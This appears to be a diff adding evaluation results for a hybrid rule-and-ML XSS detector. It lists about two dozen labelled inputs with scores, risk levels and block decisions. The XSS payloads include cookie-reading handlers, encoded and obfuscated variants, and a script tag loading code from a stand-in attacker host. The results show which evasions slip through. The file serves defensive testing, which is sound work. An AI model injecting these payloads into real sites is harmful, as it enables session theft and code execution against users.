@@ -1,0 +1,452 @@
+[
+  {
+    "id": "QUAL-A01",
+    "category": "A",
+    "category_name": "Simple XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<script>alert(1)</script>",
+      "rule_score": 57,
+      "rule_suspicious": true,
+      "ml_probability": 0.9997,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7848,
+      "risk_score": 78.48,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-A02",
+    "category": "A",
+    "category_name": "Simple XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<script src=\"https://evil-hacker.example.com/payload.js\"></script>",
+      "rule_score": 57,
+      "rule_suspicious": true,
+      "ml_probability": 0.9694,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7697,
+      "risk_score": 76.97,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-A03",
+    "category": "A",
+    "category_name": "Simple XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<SCRIPT>alert('XSS-CAPS')</SCRIPT>",
+      "rule_score": 57,
+      "rule_suspicious": true,
+      "ml_probability": 0.9981,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.784,
+      "risk_score": 78.4,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-B01",
+    "category": "B",
+    "category_name": "Event-Handler XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<img src=\"x\" onerror=\"alert(document.cookie)\">",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9943,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7571,
+      "risk_score": 75.71,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-B02",
+    "category": "B",
+    "category_name": "Event-Handler XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<svg onload=alert(document.domain)>",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9691,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7446,
+      "risk_score": 74.46,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-B03",
+    "category": "B",
+    "category_name": "Event-Handler XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<body onload=\"javascript:alert(1)\">",
+      "rule_score": 77,
+      "rule_suspicious": true,
+      "ml_probability": 0.9997,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.8849,
+      "risk_score": 88.49,
+      "risk_level": "Critical",
+      "action": "block_and_alert",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-B04",
+    "category": "B",
+    "category_name": "Event-Handler XSS",
+    "expected_label": 1,
+    "result": {
+      "payload": "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9857,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7529,
+      "risk_score": 75.29,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-C01",
+    "category": "C",
+    "category_name": "javascript: URLs",
+    "expected_label": 1,
+    "result": {
+      "payload": "javascript:alert(1)",
+      "rule_score": 25,
+      "rule_suspicious": true,
+      "ml_probability": 0.9999,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.625,
+      "risk_score": 62.5,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-C02",
+    "category": "C",
+    "category_name": "javascript: URLs",
+    "expected_label": 1,
+    "result": {
+      "payload": "<a href=\"javascript:alert(1)\">Click for Free Gift</a>",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9939,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.757,
+      "risk_score": 75.7,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-C03",
+    "category": "C",
+    "category_name": "javascript: URLs",
+    "expected_label": 1,
+    "result": {
+      "payload": "javascript:/*--></title></style>*/alert(1);",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9847,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7523,
+      "risk_score": 75.23,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-D01",
+    "category": "D",
+    "category_name": "Encoded / Entity Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "rule_score": 72,
+      "rule_suspicious": true,
+      "ml_probability": 0.9179,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.819,
+      "risk_score": 81.9,
+      "risk_level": "Critical",
+      "action": "block_and_alert",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-D02",
+    "category": "D",
+    "category_name": "Encoded / Entity Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "rule_score": 72,
+      "rule_suspicious": true,
+      "ml_probability": 0.9615,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.8408,
+      "risk_score": 84.08,
+      "risk_level": "Critical",
+      "action": "block_and_alert",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-D03",
+    "category": "D",
+    "category_name": "Encoded / Entity Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.9127,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.4564,
+      "risk_score": 45.64,
+      "risk_level": "Medium",
+      "action": "flag",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-E01",
+    "category": "E",
+    "category_name": "Obfuscated / Evasion Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+      "rule_score": 30,
+      "rule_suspicious": true,
+      "ml_probability": 0.3487,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.3243,
+      "risk_score": 32.43,
+      "risk_level": "Medium",
+      "action": "flag",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-E02",
+    "category": "E",
+    "category_name": "Obfuscated / Evasion Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
+      "rule_score": 57,
+      "rule_suspicious": true,
+      "ml_probability": 0.9841,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.777,
+      "risk_score": 77.7,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-E03",
+    "category": "E",
+    "category_name": "Obfuscated / Evasion Payloads",
+    "expected_label": 1,
+    "result": {
+      "payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+      "rule_score": 52,
+      "rule_suspicious": true,
+      "ml_probability": 0.9992,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.7596,
+      "risk_score": 75.96,
+      "risk_level": "High",
+      "action": "block",
+      "blocked": true
+    }
+  },
+  {
+    "id": "QUAL-F01",
+    "category": "F",
+    "category_name": "Syntax-Sparse / Naked JS",
+    "expected_label": 1,
+    "result": {
+      "payload": "prompt(1);>",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.5643,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.2821,
+      "risk_score": 28.21,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-F02",
+    "category": "F",
+    "category_name": "Syntax-Sparse / Naked JS",
+    "expected_label": 1,
+    "result": {
+      "payload": "confirm(document.cookie);",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.8883,
+      "ml_prediction": "xss",
+      "hybrid_signal": 0.4441,
+      "risk_score": 44.41,
+      "risk_level": "Medium",
+      "action": "flag",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-F03",
+    "category": "F",
+    "category_name": "Syntax-Sparse / Naked JS",
+    "expected_label": 1,
+    "result": {
+      "payload": "x:expression8write(1)9>",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.3181,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.159,
+      "risk_score": 15.9,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-G01",
+    "category": "G",
+    "category_name": "Benign Developer Discussions",
+    "expected_label": 0,
+    "result": {
+      "payload": "Please review the JavaScript alert system and modal notification components.",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.4568,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.2284,
+      "risk_score": 22.84,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-G02",
+    "category": "G",
+    "category_name": "Benign Developer Discussions",
+    "expected_label": 0,
+    "result": {
+      "payload": "We should avoid using innerHTML in React and prefer textContent to prevent bugs.",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.1449,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.0725,
+      "risk_score": 7.25,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-G03",
+    "category": "G",
+    "category_name": "Benign Developer Discussions",
+    "expected_label": 0,
+    "result": {
+      "payload": "The deployment script failed because node index.js timed out waiting for the database.",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.305,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.1525,
+      "risk_score": 15.25,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-H01",
+    "category": "H",
+    "category_name": "Ordinary Enterprise Web Text",
+    "expected_label": 0,
+    "result": {
+      "payload": "Order ID: 104928 - Shipment delivered to 123 Main St, Suite 400.",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.0558,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.0279,
+      "risk_score": 2.79,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-H02",
+    "category": "H",
+    "category_name": "Ordinary Enterprise Web Text",
+    "expected_label": 0,
+    "result": {
+      "payload": "Customer contact: john.doe@enterprise-corp.com | Phone: +1-555-0199",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.0739,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.037,
+      "risk_score": 3.7,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  },
+  {
+    "id": "QUAL-H03",
+    "category": "H",
+    "category_name": "Ordinary Enterprise Web Text",
+    "expected_label": 0,
+    "result": {
+      "payload": "Quarterly revenue increased by 14.8% compared to Q3 forecast (target: $2.4M).",
+      "rule_score": 0,
+      "rule_suspicious": false,
+      "ml_probability": 0.07,
+      "ml_prediction": "benign",
+      "hybrid_signal": 0.035,
+      "risk_score": 3.5,
+      "risk_level": "Low",
+      "action": "allow",
+      "blocked": false
+    }
+  }
+]
